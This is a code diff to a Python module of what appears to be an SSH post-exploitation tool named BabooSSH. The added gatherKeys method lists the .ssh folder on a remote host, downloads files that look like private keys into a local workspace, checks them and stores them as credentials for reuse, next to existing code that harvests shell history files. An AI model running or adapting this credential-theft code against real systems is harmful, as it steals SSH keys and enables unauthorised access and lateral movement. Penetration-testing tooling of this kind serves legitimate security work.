@@ -1,11 +1,18 @@
 import getpass
-import os.path
+import os
 import re
 import glob
 import ipaddress
+import json
+import subprocess
 from src.endpoint import Endpoint
 from src.user import User
 from src.path import Path
+from src.creds import Creds
+from paramiko.rsakey import RSAKey
+from paramiko.ecdsakey import ECDSAKey
+from paramiko.dsskey import DSSKey
+from paramiko.ssh_exception import *
 
 #TODO implement those
 '''
@@ -88,9 +95,10 @@ class ExtStr(type):
 
 class BaboosshExt(object,metaclass=ExtStr):
 
-    def __init__(self,socket,connection):
+    def __init__(self,socket,connection,wspaceFolder):
         self.socket = socket
         self.connection = connection
+        self.wspaceFolder = wspaceFolder
 
     @classmethod
     def getModType(cls):
@@ -106,7 +114,8 @@ class BaboosshExt(object,metaclass=ExtStr):
     
     @classmethod
     def run(cls,socket, connection, wspaceFolder):
-        g = cls(socket,connection)
+        g = cls(socket,connection, wspaceFolder)
+        #TODO move run to Try block
         g.gather()
         try:
             pass
@@ -119,11 +128,36 @@ class BaboosshExt(object,metaclass=ExtStr):
         historyFiles = self.listHistoryFiles()
         for historyFile in historyFiles:
             self.gatherFromHistory(historyFile)
+        self.gatherKeys()
+
+    def gatherKeys(self):
+        from src.params import Extensions
+        files = []
+        ret = []
+        result = self.socket.run("ls -A .ssh",hide=True)
+        for line in result.stdout.splitlines():
+            if "rsa" in line or "key" in line or "p12" in line or "dsa" in line:
+                files.append(line)
+        keysFolder = os.path.join(self.wspaceFolder,"keys")
+        for keyfile in files:
+            filename = str(self.connection.getEndpoint())+"_"+str(self.connection.getUser())+"_"+keyfile
+            filepath = os.path.join(keysFolder,filename)
+            self.socket.get(os.path.join(".ssh",keyfile),filepath)
+            subprocess.run(["chmod","600",filepath])
+            valid,haspass = Extensions.getAuthMethod("privkey").checkKeyfile(filepath)
+            if valid:
+                c= { "passphrase":"","keypath":filepath,"haspass":haspass}
+                cred = Creds("privkey",json.dumps(c))
+                cred.save()
+                ret.append(cred)
+            else:
+                os.remove(filepath)
+        print("Found "+str(len(ret))+" private keys")
 
 
     def listHistoryFiles(self):
         ret = []
-        result = self.socket.run("ls -a",hide=True)
+        result = self.socket.run("ls -A",hide=True)
         for line in result.stdout.splitlines():
             if "history" in line:
                 ret.append(line)
